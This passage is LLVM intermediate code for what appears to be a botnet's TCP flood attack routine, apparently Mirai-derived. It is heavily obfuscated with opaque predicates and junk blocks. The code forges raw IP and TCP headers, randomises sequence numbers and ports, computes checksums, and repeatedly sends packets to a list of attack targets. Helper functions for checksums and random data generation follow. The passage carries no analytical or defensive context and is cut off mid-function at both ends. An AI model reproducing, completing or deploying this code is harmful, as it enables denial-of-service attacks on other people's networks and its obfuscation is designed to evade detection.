  %434 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %435 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %434, i32 0, i32 1
  store i16 %433, i16* %435, align 2
  br label %436

; <label>:436:                                    ; preds = %430, %426
  %437 = load i32, i32* @x.51
  %438 = load i32, i32* @y.52
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %436
  %445 = load i32, i32* %18, align 4
  %446 = icmp eq i32 %445, 65535
  %447 = load i32, i32* @x.51
  %448 = load i32, i32* @y.52
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %446, label %455, label %475

; <label>:455:                                    ; preds = %originalBBpart248
  %456 = load i32, i32* @x.51
  %457 = load i32, i32* @y.52
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %455
  %464 = call i32 @rand_next()
  %465 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %466 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %465, i32 0, i32 2
  store i32 %464, i32* %466, align 4
  %467 = load i32, i32* @x.51
  %468 = load i32, i32* @y.52
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %475

; <label>:475:                                    ; preds = %originalBBpart252, %originalBBpart248
  %476 = load i32, i32* %19, align 4
  %477 = icmp eq i32 %476, 65535
  br i1 %477, label %478, label %482

; <label>:478:                                    ; preds = %475
  %479 = call i32 @rand_next()
  %480 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %481 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %480, i32 0, i32 3
  store i32 %479, i32* %481, align 4
  br label %482

; <label>:482:                                    ; preds = %478, %475
  %483 = load i8, i8* %20, align 1
  %484 = icmp ne i8 %483, 0
  br i1 %484, label %485, label %491

; <label>:485:                                    ; preds = %482
  %486 = call i32 @rand_next()
  %487 = and i32 %486, 65535
  %488 = trunc i32 %487 to i16
  %489 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 7
  store i16 %488, i16* %490, align 2
  br label %491

; <label>:491:                                    ; preds = %485, %482
  %492 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 7
  store i16 0, i16* %493, align 2
  %494 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %495 = bitcast %struct.iphdr* %494 to i16*
  %496 = call zeroext i16 @checksum_generic(i16* %495, i32 20)
  %497 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 7
  store i16 %496, i16* %498, align 2
  %499 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 6
  store i16 0, i16* %500, align 4
  %501 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %502 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %503 = bitcast %struct.tcphdr* %502 to i8*
  %504 = call zeroext i16 @htons(i16 zeroext 40) #7
  %505 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %501, i8* %503, i16 zeroext %504, i32 40)
  %506 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 6
  store i16 %505, i16* %507, align 4
  %508 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %509 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %508, i32 0, i32 1
  %510 = load i16, i16* %509, align 2
  %511 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %512 = load i32, i32* %9, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %511, i64 %513
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i32 0, i32 0
  %516 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %515, i32 0, i32 1
  store i16 %510, i16* %516, align 2
  %517 = load i32, i32* %10, align 4
  %518 = load i8*, i8** %30, align 8
  %519 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %520 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i32 0, i32 0
  %525 = bitcast %struct.sockaddr_in* %524 to %struct.sockaddr*
  store %struct.sockaddr* %525, %struct.sockaddr** %519, align 8
  %526 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %527 = load %struct.sockaddr*, %struct.sockaddr** %526, align 8
  %528 = call i64 @sendto(i32 %517, i8* %518, i64 60, i32 16384, %struct.sockaddr* %527, i32 16)
  br label %529

; <label>:529:                                    ; preds = %491
  %530 = load i32, i32* %9, align 4
  %531 = add nsw i32 %530, 1
  store i32 %531, i32* %9, align 4
  br label %338

; <label>:532:                                    ; preds = %338
  br label %321

; <label>:533:                                    ; preds = %104, %98
  %534 = load i32, i32* @x.51
  %535 = load i32, i32* @y.52
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %533
  %542 = load i32, i32* @x.51
  %543 = load i32, i32* @y.52
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %107
  store i32 0, i32* %9, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %129
  %550 = call noalias i8* @calloc(i64 128, i64 1) #6
  %551 = load i8**, i8*** %11, align 8
  %552 = load i32, i32* %9, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds i8*, i8** %551, i64 %553
  store i8* %550, i8** %554, align 8
  %555 = load i8**, i8*** %11, align 8
  %556 = load i32, i32* %9, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds i8*, i8** %555, i64 %557
  %559 = load i8*, i8** %558, align 8
  %560 = bitcast i8* %559 to %struct.iphdr*
  store %struct.iphdr* %560, %struct.iphdr** %27, align 8
  %561 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %562 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %561, i64 1
  %563 = bitcast %struct.iphdr* %562 to %struct.tcphdr*
  store %struct.tcphdr* %563, %struct.tcphdr** %28, align 8
  %564 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i64 1
  %566 = bitcast %struct.tcphdr* %565 to i8*
  store i8* %566, i8** %29, align 8
  %567 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %568 = bitcast %struct.iphdr* %567 to i8*
  %569 = load i8, i8* %568, align 4
  %_ = shl i8 %569, 15
  %_2 = sub i8 %569, 15
  %gen = mul i8 %_2, 15
  %_3 = sub i8 %569, 15
  %gen4 = mul i8 %_3, 15
  %_5 = shl i8 %569, 15
  %_6 = sub i8 0, %569
  %gen7 = add i8 %_6, 15
  %570 = and i8 %569, 15
  %_8 = sub i8 0, %570
  %gen9 = add i8 %_8, 64
  %_10 = sub i8 %570, 64
  %gen11 = mul i8 %_10, 64
  %_12 = shl i8 %570, 64
  %_13 = sub i8 %570, 64
  %gen14 = mul i8 %_13, 64
  %_15 = sub i8 0, %570
  %gen16 = add i8 %_15, 64
  %_17 = sub i8 %570, 64
  %gen18 = mul i8 %_17, 64
  %_19 = sub i8 0, %570
  %gen20 = add i8 %_19, 64
  %_21 = sub i8 0, %570
  %gen22 = add i8 %_21, 64
  %571 = or i8 %570, 64
  store i8 %571, i8* %568, align 4
  %572 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %573 = bitcast %struct.iphdr* %572 to i8*
  %574 = load i8, i8* %573, align 4
  %_23 = sub i8 0, %574
  %gen24 = add i8 %_23, -16
  %575 = and i8 %574, -16
  %_25 = sub i8 %575, 5
  %gen26 = mul i8 %_25, 5
  %_27 = sub i8 %575, 5
  %gen28 = mul i8 %_27, 5
  %_29 = shl i8 %575, 5
  %_30 = sub i8 %575, 5
  %gen31 = mul i8 %_30, 5
  %_32 = shl i8 %575, 5
  %_33 = sub i8 0, %575
  %gen34 = add i8 %_33, 5
  %576 = or i8 %575, 5
  store i8 %576, i8* %573, align 4
  %577 = load i8, i8* %12, align 1
  %578 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %579 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %578, i32 0, i32 1
  store i8 %577, i8* %579, align 1
  %580 = call zeroext i16 @htons(i16 zeroext 60) #7
  %581 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %582 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %581, i32 0, i32 2
  store i16 %580, i16* %582, align 2
  %583 = load i16, i16* %13, align 2
  %584 = call zeroext i16 @htons(i16 zeroext %583) #7
  %585 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 3
  store i16 %584, i16* %586, align 4
  %587 = load i8, i8* %14, align 1
  %588 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 5
  store i8 %587, i8* %589, align 4
  %590 = load i8, i8* %15, align 1
  %591 = icmp ne i8 %590, 0
  br label %originalBB1

originalBB38alteredBB:                            ; preds = %originalBB38, %321
  store i32 0, i32* %9, align 4
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %400
  %592 = load i16, i16* %16, align 2
  %593 = zext i16 %592 to i32
  %594 = icmp eq i32 %593, 65535
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %436
  %595 = load i32, i32* %18, align 4
  %596 = icmp eq i32 %595, 65535
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %455
  %597 = call i32 @rand_next()
  %598 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 2
  store i32 %597, i32* %599, align 4
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %533
  br label %originalBB54
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %32, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %35

; <label>:9:                                      ; preds = %6
  %10 = load i32, i32* @x.53
  %11 = load i32, i32* @y.54
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i16*, i16** %3, align 8
  %19 = getelementptr inbounds i16, i16* %18, i32 1
  store i16* %19, i16** %3, align 8
  %20 = load i16, i16* %18, align 2
  %21 = zext i16 %20 to i64
  %22 = load i64, i64* %5, align 8
  %23 = add i64 %22, %21
  store i64 %23, i64* %5, align 8
  %24 = load i32, i32* @x.53
  %25 = load i32, i32* @y.54
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %32

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* %4, align 4
  %34 = sub i32 %33, 2
  store i32 %34, i32* %4, align 4
  br label %6

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, 1
  br i1 %37, label %38, label %45

; <label>:38:                                     ; preds = %35
  %39 = load i16*, i16** %3, align 8
  %40 = load i16, i16* %39, align 2
  %41 = trunc i16 %40 to i8
  %42 = sext i8 %41 to i64
  %43 = load i64, i64* %5, align 8
  %44 = add i64 %43, %42
  store i64 %44, i64* %5, align 8
  br label %45

; <label>:45:                                     ; preds = %38, %35
  %46 = load i64, i64* %5, align 8
  %47 = lshr i64 %46, 16
  %48 = load i64, i64* %5, align 8
  %49 = and i64 %48, 65535
  %50 = add i64 %47, %49
  store i64 %50, i64* %5, align 8
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = load i64, i64* %5, align 8
  %54 = add i64 %53, %52
  store i64 %54, i64* %5, align 8
  %55 = load i64, i64* %5, align 8
  %56 = xor i64 %55, -1
  %57 = trunc i64 %56 to i16
  ret i16 %57

originalBBalteredBB:                              ; preds = %originalBB, %9
  %58 = load i16*, i16** %3, align 8
  %59 = getelementptr inbounds i16, i16* %58, i32 1
  store i16* %59, i16** %3, align 8
  %60 = load i16, i16* %58, align 2
  %61 = zext i16 %60 to i64
  %62 = load i64, i64* %5, align 8
  %_ = shl i64 %62, %61
  %63 = add i64 %62, %61
  store i64 %63, i64* %5, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #7
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

; <label>:77:                                     ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* @x.55
  %89 = load i32, i32* @y.56
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %87
  %96 = load i32, i32* %12, align 4
  %97 = xor i32 %96, -1
  %98 = trunc i32 %97 to i16
  %99 = load i32, i32* @x.55
  %100 = load i32, i32* @y.56
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %98

originalBBalteredBB:                              ; preds = %originalBB, %87
  %107 = load i32, i32* %12, align 4
  %_ = shl i32 %107, -1
  %_1 = sub i32 0, %107
  %gen = add i32 %_1, -1
  %108 = xor i32 %107, -1
  %109 = trunc i32 %108 to i16
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = load i32, i32* @x.57
  %2 = load i32, i32* @y.58
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = load i32, i32* @x, align 4
  store i32 %10, i32* %9, align 4
  %11 = load i32, i32* %9, align 4
  %12 = shl i32 %11, 11
  %13 = load i32, i32* %9, align 4
  %14 = xor i32 %13, %12
  store i32 %14, i32* %9, align 4
  %15 = load i32, i32* %9, align 4
  %16 = lshr i32 %15, 8
  %17 = load i32, i32* %9, align 4
  %18 = xor i32 %17, %16
  store i32 %18, i32* %9, align 4
  %19 = load i32, i32* @y, align 4
  store i32 %19, i32* @x, align 4
  %20 = load i32, i32* @z, align 4
  store i32 %20, i32* @y, align 4
  %21 = load i32, i32* @w, align 4
  store i32 %21, i32* @z, align 4
  %22 = load i32, i32* @w, align 4
  %23 = lshr i32 %22, 19
  %24 = load i32, i32* @w, align 4
  %25 = xor i32 %24, %23
  store i32 %25, i32* @w, align 4
  %26 = load i32, i32* %9, align 4
  %27 = load i32, i32* @w, align 4
  %28 = xor i32 %27, %26
  store i32 %28, i32* @w, align 4
  %29 = load i32, i32* @w, align 4
  %30 = load i32, i32* @x.57
  %31 = load i32, i32* @y.58
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %29

originalBBalteredBB:                              ; preds = %originalBB, %0
  %38 = alloca i32, align 4
  %39 = load i32, i32* @x, align 4
  store i32 %39, i32* %38, align 4
  %40 = load i32, i32* %38, align 4
  %_ = shl i32 %40, 11
  %_1 = shl i32 %40, 11
  %_2 = sub i32 0, %40
  %gen = add i32 %_2, 11
  %_3 = sub i32 0, %40
  %gen4 = add i32 %_3, 11
  %_5 = sub i32 0, %40
  %gen6 = add i32 %_5, 11
  %_7 = shl i32 %40, 11
  %_8 = sub i32 %40, 11
  %gen9 = mul i32 %_8, 11
  %41 = shl i32 %40, 11
  %42 = load i32, i32* %38, align 4
  %_10 = shl i32 %42, %41
  %43 = xor i32 %42, %41
  store i32 %43, i32* %38, align 4
  %44 = load i32, i32* %38, align 4
  %_11 = sub i32 0, %44
  %gen12 = add i32 %_11, 8
  %_13 = sub i32 0, %44
  %gen14 = add i32 %_13, 8
  %_15 = sub i32 %44, 8
  %gen16 = mul i32 %_15, 8
  %_17 = sub i32 0, %44
  %gen18 = add i32 %_17, 8
  %_19 = shl i32 %44, 8
  %_20 = sub i32 0, %44
  %gen21 = add i32 %_20, 8
  %_22 = shl i32 %44, 8
  %45 = lshr i32 %44, 8
  %46 = load i32, i32* %38, align 4
  %_23 = sub i32 0, %46
  %gen24 = add i32 %_23, %45
  %_25 = shl i32 %46, %45
  %_26 = sub i32 0, %46
  %gen27 = add i32 %_26, %45
  %_28 = sub i32 %46, %45
  %gen29 = mul i32 %_28, %45
  %_30 = sub i32 0, %46
  %gen31 = add i32 %_30, %45
  %_32 = sub i32 %46, %45
  %gen33 = mul i32 %_32, %45
  %_34 = sub i32 0, %46
  %gen35 = add i32 %_34, %45
  %47 = xor i32 %46, %45
  store i32 %47, i32* %38, align 4
  %48 = load i32, i32* @y, align 4
  store i32 %48, i32* @x, align 4
  %49 = load i32, i32* @z, align 4
  store i32 %49, i32* @y, align 4
  %50 = load i32, i32* @w, align 4
  store i32 %50, i32* @z, align 4
  %51 = load i32, i32* @w, align 4
  %_36 = sub i32 0, %51
  %gen37 = add i32 %_36, 19
  %52 = lshr i32 %51, 19
  %53 = load i32, i32* @w, align 4
  %_38 = sub i32 %53, %52
  %gen39 = mul i32 %_38, %52
  %_40 = sub i32 0, %53
  %gen41 = add i32 %_40, %52
  %54 = xor i32 %53, %52
  store i32 %54, i32* @w, align 4
  %55 = load i32, i32* %38, align 4
  %56 = load i32, i32* @w, align 4
  %_42 = sub i32 0, %56
  %gen43 = add i32 %_42, %55
  %57 = xor i32 %56, %55
  store i32 %57, i32* @w, align 4
  %58 = load i32, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.59
  %4 = load i32, i32* @y.60
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* @x.59
  %14 = load i32, i32* @y.60
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %21

; <label>:21:                                     ; preds = %93, %originalBBpart2
  %22 = load i32, i32* @x.59
  %23 = load i32, i32* @y.60
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %21
  %30 = load i32, i32* %12, align 4
  %31 = icmp sgt i32 %30, 0
  %32 = load i32, i32* @x.59
  %33 = load i32, i32* @y.60
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %31, label %40, label %94

; <label>:40:                                     ; preds = %originalBBpart24
  %41 = load i32, i32* %12, align 4
  %42 = icmp sge i32 %41, 4
  br i1 %42, label %43, label %53

; <label>:43:                                     ; preds = %40
  %44 = call i32 @rand_next()
  %45 = load i8*, i8** %11, align 8
  %46 = bitcast i8* %45 to i32*
  store i32 %44, i32* %46, align 4
  %47 = load i8*, i8** %11, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 4
  store i8* %48, i8** %11, align 8
  %49 = load i32, i32* %12, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 4
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %12, align 4
  br label %93

; <label>:53:                                     ; preds = %40
  %54 = load i32, i32* %12, align 4
  %55 = icmp sge i32 %54, 2
  br i1 %55, label %56, label %68

; <label>:56:                                     ; preds = %53
  %57 = call i32 @rand_next()
  %58 = and i32 %57, 65535
  %59 = trunc i32 %58 to i16
  %60 = load i8*, i8** %11, align 8
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = load i8*, i8** %11, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 2
  store i8* %63, i8** %11, align 8
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = sub i64 %65, 2
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %12, align 4
  br label %92

; <label>:68:                                     ; preds = %53
  %69 = load i32, i32* @x.59
  %70 = load i32, i32* @y.60
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = call i32 @rand_next()
  %78 = and i32 %77, 255
  %79 = trunc i32 %78 to i8
  %80 = load i8*, i8** %11, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 1
  store i8* %81, i8** %11, align 8
  store i8 %79, i8* %80, align 1
  %82 = load i32, i32* %12, align 4
  %83 = add nsw i32 %82, -1
  store i32 %83, i32* %12, align 4
  %84 = load i32, i32* @x.59
  %85 = load i32, i32* @y.60
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart217, label %originalBB6alteredBB

originalBBpart217:                                ; preds = %originalBB6
  br label %92

; <label>:92:                                     ; preds = %originalBBpart217, %56
  br label %93

; <label>:93:                                     ; preds = %92, %43
  br label %21

; <label>:94:                                     ; preds = %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %95 = alloca i8*, align 8
  %96 = alloca i32, align 4
  store i8* %0, i8** %95, align 8
  store i32 %1, i32* %96, align 4
